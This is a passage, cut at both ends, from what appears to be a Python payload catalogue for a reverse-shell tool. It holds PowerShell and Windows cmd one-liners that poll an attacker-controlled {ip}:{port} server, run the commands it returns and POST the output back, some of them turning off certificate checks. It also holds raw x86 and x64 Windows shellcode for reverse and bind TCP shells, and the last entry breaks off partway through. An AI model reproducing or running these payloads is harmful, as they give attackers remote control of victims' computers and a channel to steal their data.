        "command": "$s='{ip}:{port}';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f=\"C:\\Users\\$env:USERNAME\\.local\\hack.ps1\";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
        "meta": ["windows"]
    },
    {
        "name": "PowerShell Outfile Constr Lang Mode",
        "command": "$s='{ip}:{port}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='http://';$f=\"C:\\Users\\$env:USERNAME\\.local\\hack.ps1\";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{\"Authorization\"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
        "meta": ["windows"]
    },
    {
        "name": "Windows CMD cURL https",
        "command": '@echo off&cmd /V:ON /C "SET ip={ip}:{port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1" > NUL',
        "meta": ["windows"]
    },
    {
        "name": "PowerShell IEX https",
        "command": 'add-type @"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s=\'{ip}:{port}\';$i=\'1cdbb583-f96894ff-f99b8edc\';$p=\'https://\';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1cdbb583 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/f96894ff -Headers @{"Authorization"=$i});if ($c -ne \'None\') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/f99b8edc -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join \' \')} sleep 0.8}',
        "meta": ["windows"]
    },
    {
        "name": "PowerShell Constr Lang Mode IEX https",
        "command": 'add-type @"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s=\'{ip}:{port}\';$i=\'11e6bc4b-fefb1eab-68a9612e\';$p=\'https://\';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/11e6bc4b -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/fefb1eab -Headers @{"Authorization"=$i});if ($c -ne \'None\') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/68a9612e -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}',
        "meta": ["windows"]
    },
    {
        "name": "PowerShell Outfile https",
        "command": 'add-type @"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s=\'{ip}:{port}\';$i=\'add29918-6263f3e6-2f810c1e\';$p=\'https://\';$f="C:\\Users\\$env:USERNAME\\.local\\hack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{"Authorization"=$i});if ($c -eq \'exit\') {del $f;exit} elseif ($c -ne \'None\') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join \' \')} sleep 0.8}',
        "meta": ["windows"]
    },
    {
        "name": "PowerShell Outfile Constr Lang Mode https",
        "command": 'add-type @"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s=\'{ip}:{port}\';$i=\'e030d4f6-9393dc2a-dd9e00a7\';$p=\'https://\';$f="C:\\Users\\$env:USERNAME\\.local\\hack.ps1";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{"Authorization"=$i}); if ($c -eq \'exit\') {del $f;exit} elseif ($c -ne \'None\') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}',
        "meta": ["windows"]
    }
])


# ============================================================================
# 汇编 Shellcode 命令 (14 条)
# ============================================================================

ASSEMBLED_COMMANDS = _tag(CommandType.Assembled, [
    {
        "name": "Windows - Reverse TCP (x86)",
        "command": "\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68{ip}\\x68\\x02\\x00{port}\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\\xe3\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6\\x00\\x44\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\\x53\\x56\\x68\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\\x30\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5",
        "meta": ["windows"]
    },
    {
        "name": "Windows - Reverse TCP (x86, staged)",
        "command": "\\xfc\\xe8\\x8f\\x00\\x00\\x00\\x60\\x31\\xd2\\x89\\xe5\\x64\\x8b\\x52\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x0f\\xb7\\x4a\\x26\\x8b\\x72\\x28\\x31\\xff\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\x49\\x75\\xef\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x01\\xd0\\x8b\\x40\\x78\\x85\\xc0\\x74\\x4c\\x01\\xd0\\x50\\x8b\\x48\\x18\\x8b\\x58\\x20\\x01\\xd3\\x85\\xc9\\x74\\x3c\\x31\\xff\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xc0\\xc1\\xcf\\x0d\\xac\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe0\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xe9\\x80\\xff\\xff\\xff\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\x89\\xe8\\xff\\xd0\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a\\x68{ip}\\x68\\x02\\x00{port}\\x89\\xe6\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\xff\\x4e\\x08\\x75\\xec\\xe8\\x67\\x00\\x00\\x00\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7e\\x36\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x68\\x00\\x40\\x00\\x00\\x6a\\x00\\x50\\x68\\x0b\\x2f\\x0f\\x30\\xff\\xd5\\x57\\x68\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x5e\\x5e\\xff\\x0c\\x24\\x0f\\x85\\x70\\xff\\xff\\xff\\xe9\\x9b\\xff\\xff\\xff\\x01\\xc3\\x29\\xc6\\x75\\xc1\\xc3\\xbb\\xf0\\xb5\\xa2\\x56\\x6a\\x00\\x53\\xff\\xd5",
        "meta": ["windows"]
    },
    {
        "name": "Windows - Bind TCP (x86)",
        "command": "\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x08\\x59\\x50\\xe2\\xfd\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x68\\x02\\x00{port}\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\xc2\\xdb\\x37\\x67\\xff\\xd5\\x57\\x68\\xb7\\xe9\\x38\\xff\\xff\\xd5\\x57\\x68\\x74\\xec\\x3b\\xe1\\xff\\xd5\\x57\\x97\\x68\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\\xe3\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6\\x00\\x44\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\\x53\\x56\\x68\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\\x30\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5",
        "meta": ["windows"]
    },
    {
        "name": "Windows - Bind TCP (x86, staged)",
        "command": "\\xfc\\xe8\\x8f\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x31\\xff\\x0f\\xb7\\x4a\\x26\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\x49\\x75\\xef\\x52\\x8b\\x52\\x10\\x57\\x8b\\x42\\x3c\\x01\\xd0\\x8b\\x40\\x78\\x85\\xc0\\x74\\x4c\\x01\\xd0\\x8b\\x58\\x20\\x50\\x01\\xd3\\x8b\\x48\\x18\\x85\\xc9\\x74\\x3c\\x49\\x31\\xff\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xc0\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe0\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xe9\\x80\\xff\\xff\\xff\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0b\\x59\\x50\\xe2\\xfd\\x6a\\x01\\x6a\\x02\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x68\\x02\\x00{port}\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\xc2\\xdb\\x37\\x67\\xff\\xd5\\x85\\xc0\\x0f\\x85\\x58\\x00\\x00\\x00\\x57\\x68\\xb7\\xe9\\x38\\xff\\xff\\xd5\\x57\\x68\\x74\\xec\\x3b\\xe1\\xff\\xd5\\x57\\x97\\x68\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7e\\x2d\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7e\\x07\\x01\\xc3\\x29\\xc6\\x75\\xe9\\xc3\\xbb\\xf0\\xb5\\xa2\\x56\\x6a\\x00\\x53\\xff\\xd5",
        "meta": ["windows"]
    },
    {
        "name": "Windows - Reverse TCP (x64)",
        "command": "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5\\x49\\xbc\\x02\\x00{port}{ip}\\x41\\x54\\x49\\x89\\xe4\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba\\x99\\xa5\\x74\\x61\\xff\\xd5\\x48\\x81\\xc4\\x40\\x02\\x00\\x00\\x49\\xb8\\x63\\x6d\\x64\\x00\\x00\\x00\\x00\\x00\\x41\\x50\\x41\\x50\\x48\\x89\\xe2\\x57\\x57\\x57\\x4d\\x31\\xc0\\x6a\\x0d\\x59\\x41\\x50\\xe2\\xfc\\x66\\xc7\\x44\\x24\\x54\\x01\\x01\\x48\\x8d\\x44\\x24\\x18\\xc6\\x00\\x68\\x48\\x89\\xe6\\x56\\x50\\x41\\x50\\x41\\x50\\x41\\x50\\x49\\xff\\xc0\\x41\\x50\\x49\\xff\\xc8\\x4d\\x89\\xc1\\x4c\\x89\\xc1\\x41\\xba\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x48\\x31\\xd2\\x48\\xff\\xca\\x8b\\x0e\\x41\\xba\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5",
        "meta": ["windows"]
    },
    {
        "name": "Windows - Reverse TCP (x64, staged)",
        "command": "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x51\\x48\\x8b\\x52\\x20\\x56\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\\x85\\x72\\x00\\x00\\x00\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\x8b\\x48\\x18\\x50\\xe3\\x56\\x4d\\x31\\xc9\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x48\\x31\\xc0\\x41\\xc1\\xc9\\x0d\\xac\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x41\\x58\\x48\\x01\\xd0\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5\\x49\\xbc\\x02\\x00{port}{ip}\\x41\\x54\\x49\\x89\\xe4\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5\\xe8\\x93\\x00\\x00\\x00\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9\\x6a\\x04\\x41\\x58\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41\\x59\\x68\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\\x00\\x40\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\\x30\\xff\\xd5\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\\xff\\xce\\xe9\\x3c\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\x75\\xb4\\x41\\xff\\xe7\\x58\\x6a\\x00\\x59\\x49\\xc7\\xc2\\xf0\\xb5\\xa2\\x56\\xff\\xd5",
        "meta": ["windows"]
    },
    {
        "name": "Windows - Bind TCP (x64)",
        "command": "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5\\x49\\xbc\\x02\\x00{port}\\x00\\x00\\x00\\x00\\x41\\x54\\x49\\x89\\xe4\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x48\\x89\\xc7\\x6a\\